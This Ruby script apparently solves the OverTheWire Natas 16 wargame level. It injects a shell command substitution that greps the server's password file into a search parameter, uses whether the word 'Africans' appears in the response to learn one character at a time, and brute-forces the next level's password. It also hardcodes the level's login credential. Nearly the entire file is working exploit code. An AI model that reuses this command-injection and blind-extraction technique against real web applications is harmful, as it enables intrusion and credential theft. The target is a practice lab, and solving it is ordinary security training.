require 'uri'
require 'net/http'

def get inject
    uri = URI.parse 'http://natas16.natas.labs.overthewire.org/index.php'
    uri.query = URI.encode_www_form({ :needle => "Africans$(grep #{inject} /etc/natas_webpass/natas17)" })
    req = Net::HTTP::Post.new uri
    req.basic_auth "natas16", "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
    res = Net::HTTP.start uri.hostname, uri.port do |http|
        http.request req
    end
    !(res.body.include? "Africans")
end

def checkCharDomain
    chars = ""
    for i in (48..57).to_a + (65..90).to_a + (97..122).to_a
        injection = i.chr
        puts injection
        if get injection
            chars = chars + i.chr
            puts "DOMAIN: " + chars
        end
    end
end

# Runnnig checkCharDomain will produce: 0179BCEHIKLRSUXbdhkmnsuv
# checkCharDomain

def brute
    domain = "0179BCEHIKLRSUXbdhkmnsuv".split ''
    pass = ""
    loop do
        finished = true
        for i in domain
            injection = "^" + pass + i
            puts injection
            if get injection
                pass = pass + i
                puts pass
                finished = false
                break
            end
        end
        if finished
            puts "Finished: " + pass
            break
        end
    end
end

brute